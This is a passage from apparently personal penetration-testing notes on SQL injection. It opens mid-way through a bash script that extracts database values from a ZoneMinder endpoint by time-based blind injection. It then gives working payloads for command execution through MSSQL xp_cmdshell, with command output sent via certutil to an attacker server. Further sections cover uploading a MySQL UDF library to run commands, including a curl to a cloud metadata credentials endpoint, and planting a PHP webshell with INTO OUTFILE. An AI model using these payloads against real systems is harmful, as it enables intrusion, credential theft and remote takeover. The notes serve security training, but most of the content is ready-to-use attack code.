field=$4        # pass the name of the field from which the value is to be obtained as argument 4
charlimit=100

# ADAPT THESE VALUES
host='192.168.102.52'

# correction of the character limit depending on whether one is given as argument 5
if [[ "$#" -eq "5" ]]
then
charlimit=$5
fi

# variable to store the characters to be tested
char='0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!¡\/{}[]'

# variable to store the results
result=""
whitechar=0

echo -e "\n${white}[${green}*${white}] --- Enumerando valor del campo \"${yellow}$field${white}\" de la tabla \"${yellow}$tablename${white}\" en base al valor \"${yellow}$fielvalue${white}\" del campo \"${yellow}$fieldname${white}\" de la misma tabla --- [${green}*${white}]${def}\n"

for (( i=1; i <= $charlimit; i++))
do
if [[ "whitechar" -ge "2" ]]
then
echo -e "  \e[1A\e[K[${grey}-${def}] Segundo caracter en blanco"
break
fi

# nested loop that runs through each of the characters stored in the variable char
for (( k=0; k<${#char}; k++ ))
do
echo -e "  \e[1A\e[KProbando caracter ${char:$k:1} en posición $i: $result""_"

SECONDS=0
curl -X POST "http://$host/zm/index.php" \
-d "view=request&request=log&task=query&limit=100;( SELECT * FROM ( \
SELECT( \
if( 
substr( \
(select $field from $tablename where $fieldname='$fielvalue'),$i,1)='${char:$k:1}', sleep(5), 1 \
) \
) \
)OQkj)#minTime=1'" &>/dev/null

DURATION=$SECONDS

# check if the difference between the start and end time is greater than 5 seconds
if [[ "$DURATION" -ge "4" ]]
then
result+=${char:$k:1}
if [[ "$i" -ge 1 ]]
then
if [[ "$whitechar" -eq 1 ]] # write correction if the first character was blank but the others were not
then
echo -e "  \e[1A\e[KCaracteres encontrados: $result\n"
whitechar=0
break
else
echo -e "  \e[2A\e[KCaracteres encontrados: $result\n"
whitechar=0
break
fi
else
echo -e "  \e[1A\e[KCaracteres encontrados: $result\n"
break
fi
else
if [[ "${char:$k:1}" = "z" ]]
then
whitechar=$((whitechar+1))
fi
fi
done
done

echo -e "  ${white}Valor del campo $field para el valor $fielvalue del campo $fieldname en la tabla $tablename: ${green}$result${def}\n"
echo -e "  Fin de la enumeración."
tput cnorm
```

Note that in this case the statement is put in parentheses, so that it does not give errors in the execution.
A whitespace counter is added (to lighten the search).
The first character that does not match will be continued, to allow compound names, with two or more words.
The second time, consecutively, that it does not find a match, it understands that it is 2 blanks in a row and understands that the search is finished.
  
  
  
## Remote Command Execution (RCE) with SQLI  
  
  
### XP_CMDSHELL  
  
In MSSQL there is a process called xp_cmdshell. This process receives a command from windows, executes it and returns the result as text lines.
By default it is disabled.

#### Enable xp_cmdshell  

<mark style="color:green">EXEC sp_configure 'show advanced options', 1; RECONFIGURE;</mark>  
<mark style="color:green">EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;</mark>  

#### ACE with xp_cmdshell  

To verify if we have the ability to execute commands via xp_cmdshell we use "certutil".  
This command will perform a 'GET' request to the given $ip.  

```sql
';EXEC xp_cmdshell 'certutil -urlcache -f http://$ip';--
```

Where:

* "<mark style="color:orange">';</mark>" and "<mark style="color:orange">;--</mark>" are part of the request that enables SQLi.  
* <mark style="color:orange">$ip</mark> is the ip of the attacking machine where an HTTP server will be waiting for the request, if it receives it is that we have execution capability.  

#### RCE with xp_cmdshell  

With xp_cmdshell, since the injection does not occur in the originating query we will not be able to see the output of the command.  
If we have the ability to execute "certutil" we can exfiltrate data using this command to send GET requests to our r server containing this data.  
The data is Base64 encoded as it allows more information to be transferred in fewer characters.  

##### Process  

1. Declare a variable of type "table" to store the output of the commands executed using the xp_cmdshell process  
<mark style="color:green">declare @r varchar(4120),@cmdOutput varchar(4120);</mark>  
<mark style="color:green">declare @res TABLE(line varchar(max));</mark>  
2. Dump the output of the executed commands into the variable  
<mark style="color:green">insert into @res exec xp_cmdshell 'COMMAND';</mark>  
3. Concatenate the rows of the table separating them with "line break"  
If we do not have the group_concat function, we can use 'FOR XML' to concatenate the rows into a single string in XML format we use an empty string like 'PATH mode' to remove the labels  
<mark style="color:green">SELECT column+char(10) as 'text()' FROM table FOR XML path('')  
4. Base64 encode the resulting string and store it into a variable
As it is not possible to directly convert a string to Base64, the solution is to convert the string to binary data beforehand  
<mark style="color:green">SELECT cast('tarlogic' AS varbinary(max)) FOR XML path(''), BINARY BASE64</mark>  
5. Use the "certutil" command to make the 'GET' request adding the information contained in the variable.  

##### Example  

<mark style="color:green">declare @r varchar(4120),@cmdOutput varchar(4120);</mark>  
<mark style="color:green">declare @res TABLE(line varchar(max));</mark>  
<mark style="color:green">insert into @res exec xp_cmdshell 'COMMAND';</mark>  
<mark style="color:green">set @cmdOutput=(select (select cast((select line+char(10) COLLATE SQL_Latin1_General_CP1253_CI_AI as 'text()' from @res for xml path('')) as varbinary(max))) for xml path(''),binary base64);</mark>  
<mark style="color:green">set @r=concat('certutil -urlcache -f https://redteam/',@cmdOutput);</mark>  
<mark style="color:green">exec xp_cmdshell @r;</mark>  

##### Automation  

Once we have the ability to execute and display the output of any command, we proceed to automate the process.
The following link has a tool that provides the user with a prompt to enter a command.
It then generates the necessary payload to execute it while implementing a web server to receive the output. Finally, it decodes it and displays it on screen.
  
  

## RCE in MySQL via UDF (User Defined Functions)  
  
  
### Resources  

<https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet>  
<https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection/mysql-ssrf>  
<https://osandamalith.com/2018/02/11/mysql-udf-exploitation/>  
<https://dev.mysql.com/doc/refman/5.7/en/create-table.html>  
<https://www.tutorialspoint.com/mysql/mysql-create-tables.htm>  
  
  
### Description  

It consists of loading a customized library (with customized functions) in a table of the database, to later dump it to the path of the libraries for MySQL.
Finally, calls can be made to the functions defined in the custom library by means of the SQLi capability that you have.  

Depending on the MySQL version (identify with 'SELECT @@version) the directory from which you can load the plugins is restricted.  

MySQL below v5.0.67 allows library files to be loaded from the system path, if the plugin_dir variable is not set.  

Newer versions have the plugin_dir variable set to something like "/usr/lib/mysql/plugin/", which is usually owned by root (check with 'SELECT @@plugin_dir').  
  
  
### Requirements

- The SQLi must be executed by a user with INSERT capability on the 'mysql' database.  
- SQLi must be executed by a user with remote access capability from any host.  
- Ability to write to the location specified in @@plugin_dir via the SQLi  
- file_priv set to Y in mysql.user for the database user  
- secure_file_priv set to "" to read raw bytes from an arbitrary location, such as the network or a file upload directory in a web application.  

If the above conditions are met, you can transfer the MySQL UDF lib_mysqludf_sys library to the database server.  

Then you can make requests for operating system commands such as curl or powershell wget to perform SSRF using the syntax:  

<mark style="color:green">x'; SELECT sys_eval('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //</mark>  
  
  
### Functions
<mark style="color:green">sys_exec</mark>  
<mark style="color:green">sys_eval</mark>  
<mark style="color:green">http_get</mark>  
  
  
### Example
<mark style="color:green">curl -X POST "http://</mark><mark style="color:yellow">$ip/zm/index.php</mark><mark style="color:green">" -d "</mark><mark style="color:orange">view=request&request=log&task=query&limit=100;(</mark><mark style="color:green"> SELECT * FROM (SELECT(</mark><mark style="color:yellow">sys_exec('ping -c 2 192.168.49.102'</mark><mark style="color:green">))</mark><mark style="color:orange">)OQkj)#minTime=1'</mark><mark style="color:green">"</mark>
  
  
### Complete Process

1. Select the appropriate library according to the OS and architecture of the victim machine:  

	```ssh
	# ls /usr/share/metasploit-framework/data/exploits/mysql/
	lib_mysqludf_sys_32.dll lib_mysqludf_sys_32.so lib_mysqludf_sys_64.dll lib_mysqludf_sys_64.so
	```  
2. We convert the selected library into a Hexadecimal String:  
	```ssh
	xxd -p libSelec.ext | tr -d '\n' > libSelecHex.txt
	```  
3. Split the hexadecimal string into 256 byte files (this will generate file named xaa, xab, xac, ..., xnn of 256 bytes)  
	```ssh
	split -b 256 libSelecHex.txt
	```  
4. To facilitate the following process:  
	a) we save the name of the files created in a list:  
		```ssh
		ls x* > parts_string_hex.txt
		```  
	b) delete the first line of the file (since this is inserted first, separately from the rest):  
		```ssh
		sed -i -e "1d" parts_string_hex.txt
		```  
	c) change the name of the first file (to facilitate the insertion process later):  
		```ssh
		mv xaa aaa
		```  

	<mark style="color:yellow">!!!→</mark> The following commands have to be executed as PAYLOAD of the SQLi capability we have.  
	To make it easier, we <mark style="color:yellow">**create a script**</mark> that uses the argument that we pass as PAYLOAD of the request with which we have SQLi capacity.  

5. We create a new table:  
	```ssh
	./script.sh "CREATE TABLE tableName(columnName longblob)"
	```  
6. Insert the first part of the hexadecimal string in the created column:  
	```ssh
	./script.sh "INSERT INTO tableName(columnName) VALUES (0x$(cat aaa))"
	```  

7. Concatenate the rest of the parts of the hexadecimal string with the value stored in the created column  
	```ssh
	for file in $(cat partes_cadena_hex.txt); do ./script.sh "UPDATE nombreTabla SET nombreColumna=CONCAT(data,0x$(cat $file))"; done
	```  
8. We dump the content of the created column inside a file, with an extension appropriate to the OS of the victim (.dll || .so), in the plugins folder  
	```ssh
	./script.sh "SELECT columnName FROM tableName INTO DUMPFILE '/usr/lib/mysql/plugin/customlib.so'".
	```  
9. We create the functions for command execution and for command evaluation:  
	```ssh
	./script.sh "CREATE FUNCTION sys_exec RETURNS int SONAME 'customlib.so'"
	./script.sh "CREATE FUNCTION sys_eval RETURNS string SONAME 'customlib.so'"
	```  
10. We run a ping against our machine to verify that it works:  
	```ssh
	./script.sh "SELECT sys_exec('ping -c2 $host')"
	```  
  
  
  
## Backdoor on Web Server with SQLi (SQL Injection)  
  
  
### Legitimate SQL request used in examples  
<mark style="color:green">select user, password from user where user="admin" and password='123'.</mark>  
  
  
### Write Arbitrary Files  

##### MySQL command  
mysql> <mark style="color:green">select "text" INTO OUTFILE "file.txt"</mark>  

##### Attached to Legitimate Request with **UNION SQL**  
<mark style="color:green">select user, password from user where user="admin" and password="123" UNION select "text",2 into outfile "/tmp/file.txt" -- '</mark>  

##### Result  
The file "/tmp/file.txt" including the result of the query will be created.  
  
  
### Read Arbitrary Files  

##### MySQL command  
mysql> <mark style="color:green">select load_file("PATH_TO_FILE");</mark>

##### Attached to Legitimate Request with UNION SQL  
<mark style="color:green">select user, password from user where user="admin" and password="123" UNION select load_file("/etc/passwd"), 2-- '</mark>
  
  
### Webshell  

##### Simple Webshell code  
<? system($_REQUEST['cmd']); ?>

##### Scenario  
Path with write permission used in the examples: <mark style="color:blue">/var/www/html/temp</mark>  

##### Execution  

1. Find a SQL Injection (SQLi).  
2. Locate a directory with write permissions.  
	Option A:  
		Temporary directories used by CMSs. Check these URLs to find one  
		- hxxp://www.target.com/templates_compiled/  
		- hxxp://www.target.com/templates_c/  
		- hxxp://www.target.com/templates/  
		- hxxp://www.target.com/temporary/  
		- hxxp://www.target.com/images/  
		- hxxp://www.target.com/cache/  
		- hxxp://www.target.com/temp/  
		- hxxp://www.target.com/files/  
	Option B:  
		Generate PHP Errors.  
			Cause a php script to fail, this will print the full path along with the error message.  
			Playing with page parameters can cause this to happen.  
		Search for file that Print phpinfo().  
			For example:  
				◇ hxxp://www.target.com/phpinfo.php  
				◇ hxxp://www.target.com/test.php  
				◇ hxxp://www.target.com/info.php  
		Search Default Web Directory Location  
			<https://web.archive.org/web/20131205065157/http://wiki.apache.org/httpd/DistrosDefaultLayout>  
		Read Apache Configuration File  
			Use load_file() command to read apache2.conf file  
			<mark style="color:green">select user, password from user where user="admin123" and password="123&" UNION select load_file("/etc/apache2/apache2.conf"), 2 -- '</mark>  
3. Using the SLQi to Create the Webshell  
	Add the following string to the legitimate SQL command:  
	<mark style="color:green">!!!</mark><mark style="color:red">\*\*\*</mark> Check the number of columns in that query (with <mark style="color:green">' order by 100-- -</mark>) to adapt the value of ,<mark style="color:yellow">2</mark>,<mark style="color:yellow">3</mark>,<mark style="color:yellow">4</mark> or remove them if only 1.
	<mark style="color:green">' UNION SELECT ("<?php system($_REQUEST['cmd']); ?>")</mark><mark style="color:yellow">,2,3,4</mark><mark style="color:green"> INTO OUTFILE '</mark><mark style="color:blue">/var/www/html/</mark><mark style="color:yellow">temp</mark>/<mark style="color:yellow">c.php</mark><mark style="color:green">' -- 1</mark>  
	Where:  
	<mark style="color:orange">2,3,4</mark> For the request to have the same number of columns as the first part of the Legitimate Request (in this case 3 columns are added).  
	<mark style="color:blue">/var/www/html</mark>  Default Web directory of RedHat-like distributions (Fedora, CentOS).  
	<mark style="color:yellow">temp</mark> Directory with write permissions.  
4. Execution of Shell Commands  
	Request type: <mark style="color:green">hxxp://www.target.com/temp/c.php?cmd=SHELL_COMMAND</mark>
	Example: <mark style="color:green">hxxp://www.target.com/temp/c.php?cmd=id </mark>

[mysql_info_func]: <https://dev.mysql.com/doc/refman/5.7/en/information-functions.html>
[pentest_mysql_inject]: <https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet>
[hacktricks_mysql_inject]: <https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection/mysql-ssrf>
[sqli_pwner_POST]: <../../../.gitbook/assets/scripts/sqli_pwner_POST.py>
[sqli_CURL]: <../../../.gitbook/assets/scripts/sqli_CURL.sh>
[sqli_pwner_GET.py]: <../../../.gitbook/assets/scripts/sqli_pwner_GET.py.py>